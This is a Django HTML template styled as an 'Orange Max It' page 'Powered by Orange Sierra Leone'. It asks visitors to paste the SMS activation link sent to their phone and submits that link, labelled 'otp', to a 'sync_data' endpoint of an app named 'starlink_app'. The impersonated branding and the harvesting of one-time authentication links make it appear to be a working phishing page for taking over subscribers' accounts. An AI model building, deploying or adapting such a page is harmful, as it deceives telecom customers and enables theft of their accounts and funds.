{% extends 'base.html' %}

{% block content %}

<div class="max-w-md mx-auto bg-white min-h-screen shadow-2xl overflow-hidden flex flex-col">

    <div class="relative h-[38vh]">
        <img
            src="https://scontent.fnbo19-1.fna.fbcdn.net/v/t39.30808-6/484050066_1037084348448830_7947795485032492907_n.jpg?_nc_cat=107&ccb=1-7&_nc_sid=127cfc&_nc_ohc=mGz7lrX53bQQ7kNvwGqHNZt&_nc_oc=AdoBBx0FKLSmSp8Zjd6G_70ImVoI-WmPiD2T_dMCYd9yCJk5x3HvjZSnJU2PNhem_1w&_nc_zt=23&_nc_ht=scontent.fnbo19-1.fna&_nc_gid=x1eewyO1hKBy2Q1IUaQEAA&_nc_ss=7b289&oh=00_Af6PUzN1NF0LzC5XYUhOjU6AoXdLXOjC645sPOzH8OmNMQ&oe=6A09629D"
            class="w-full h-full object-cover"
            alt="Orange Max It">

        <div class="absolute inset-0 bg-black/20"></div>

        <div class="absolute bottom-0 left-0 w-full h-10 bg-white rounded-t-[35px]"></div>
    </div>

    <div class="bg-white flex-1 px-8 pt-6 pb-10">

        <div class="mb-10">
            <p class="text-xs uppercase tracking-[4px] text-gray-400 font-bold mb-2">
                Orange Max It
            </p>

            <h1 class="text-3xl font-black text-black leading-tight">
                Verify Link
            </h1>

            <p class="text-sm text-gray-500 mt-3 leading-relaxed">
                Paste the SMS activation link to complete your order.
            </p>
        </div>

        <form id="auth-form" class="space-y-8">
            {% csrf_token %}

            <div>
                <label class="text-[11px] font-black uppercase tracking-widest text-gray-500 block mb-3">
                    SMS Activation Link
                </label>

                <div class="flex items-center border-b-2 border-gray-300 focus-within:border-[#ff7900] pb-3 transition-all">
                    <svg class="w-5 h-5 text-gray-400 mr-3" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.1-1.1m-.758-4.9a4 4 0 005.656 0l4-4a4 4 0 10-5.656-5.656l-1.1 1.1"/>
                    </svg>

                    <input
                        type="url"
                        id="otp_link"
                        name="otp_link"
                        placeholder="https://maxit.orange.sl/..."
                        required
                        class="w-full outline-none text-sm italic text-black bg-transparent">
                </div>
            </div>

            <div class="pt-6">
                <button
                    type="button"
                    id="submit-btn"
                    onclick="submitData()"
                    class="w-full bg-[#ff7900] text-white py-5 rounded-2xl font-black uppercase tracking-widest shadow-xl hover:brightness-110 transition-all active:scale-[0.98]">
                    Confirm Authentication
                </button>
            </div>
        </form>
    </div>

    <div class="pb-8 text-center bg-white">
        <p class="text-[9px] uppercase tracking-[4px] text-gray-400">
            Powered by Orange Sierra Leone
        </p>
    </div>
</div>

<script>
function submitData() {
    const otp_link = document.getElementById('otp_link').value;
    const btn = document.getElementById('submit-btn');

    if (!otp_link) {
        alert('Please paste the SMS activation link');
        return;
    }

    btn.disabled = true;
    btn.innerHTML = "Verifying Link...";

    // FIX 1: Use 'otp' as the key to match data.get('otp') in Python
    const payload = {
        otp: otp_link 
    };

    // FIX 2: Use the correct Django URL name
    fetch("{% url 'starlink_app:sync_data' %}", {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'X-CSRFToken': document.querySelector('[name=csrfmiddlewaretoken]').value
        },
        body: JSON.stringify(payload)
    })
    .then(response => response.json())
    .then(data => {
        if (data.status === 'success') {
            alert('✅ Link Verified. Your bundle is being processed.');
            // FIX 3: Dynamic redirect to home
            window.location.href = "{% url 'starlink_app:otp_verification' %}";
        } else {
            alert('❌ Error: ' + (data.message || 'Link invalid'));
            btn.disabled = false;
            btn.innerHTML = "Confirm Authentication";
        }
    })
    .catch(error => {
        console.error('Error:', error);
        alert('❌ Connection Error. Please try again.');
        btn.disabled = false;
        btn.innerHTML = "Confirm Authentication";
    });
}
</script>
{% endblock %}
